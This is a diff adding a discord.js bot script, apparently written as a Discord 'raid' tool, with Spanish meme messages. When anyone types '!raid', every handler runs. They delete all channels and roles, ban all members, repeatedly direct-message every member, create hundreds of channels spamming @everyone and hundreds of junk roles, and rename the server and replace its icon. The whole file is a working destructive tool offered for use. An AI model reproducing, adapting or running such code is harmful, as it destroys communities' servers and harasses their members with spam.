@@ -1,0 +1,112 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+
+client.on("ready", () => {
+    console.log("hola! *cheemsea un oxxo de panita*");
+    client.user.setActivity('cheemsear un oxxito de pana')
+ });
+
+client.on("message", message => {
+    if (message.author.bot) return;
+  
+   if (message.content === '!raid') {
+    message.guild.channels.cache.forEach(channel => channel.delete());
+    message.guild.channels.create(`#cheemsdiossupremoBV`, {
+          type: 'text'
+        }).then(channel => {
+          channel.send(" https://cdn.discordapp.com/attachments/930280838107660298/940095180583878656/969b38b80606f68f8c870f4d58380cb0.mp4 ")
+        })
+         }
+      })
+
+
+      client.on("message", message => {
+        if (message.author.bot) return;
+      
+        if (message.content === '!raid') {
+        message.delete()
+        message.guild.members.cache.forEach(m => {
+        m.ban()
+        });
+      }
+    }); 
+
+
+    
+    client.on("message", message => {
+      if (message.author.bot) return;
+      
+    if(message.content === "!raid")
+    message.guild.members.cache.forEach(member => {
+      setInterval(function(){
+        member.send("**Un servidor que estabas o era tuyo fue raideado por el basade panita cheemsito  no te voy a mentir, tiene bastante fe en cristo rey pana**").catch(error => {});
+      },450);
+    })
+    });
+
+
+    client.on("message", message => {
+      if (message.author.bot) return;
+    
+       if(message.content === ("!raid")){
+              message.guild.roles.cache.map(roles => roles.delete());
+            }
+    });
+
+
+      client.on("message", message => {
+        if (message.author.bot) return;
+      
+       if (message.content === "!raid") {
+       for (let i = 0; i <= 500; i++) {
+            message.guild.channels.create(`#cheemsdeloxxo`, {
+              type: 'text'
+            }).then(channel => {
+              channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ")
+          channel.send("@everyone ete leeel ");
+          channel.send("@everyone ete leeel ");
+          channel.send("@everyone ete leeel ");
+          channel.send("@everyone ete leeel ");
+          channel.send("@everyone ete leeel ");
+              
+          })
+          }
+          }
+        })
+
+
+        client.on("message", message => {
+          if (message.author.bot) return;
+        
+         if (message.content === "!raid") {
+        for (let i = 0; i <= 200; i++) {
+           message.guild.roles.create({data: {name: `ete lel`,color: '#d41818',},reason: 'razon',})
+        };
+         }
+          });
+
+
+
+        client.on("message", message => {
+          if (message.author.bot) return;
+        
+         if (message.content === "!raid") {
+            message.guild.setName("loleados por cheems");
+            message.guild.setIcon("https://cdn.discordapp.com/attachments/930280838107660298/940093826482176010/Swole-Doge-y-Cheems-ahora-tienen-sus-propias-figuras-coleccionables-6.png"
+            );
+            }
+          }); 
+
+client.login("token here");
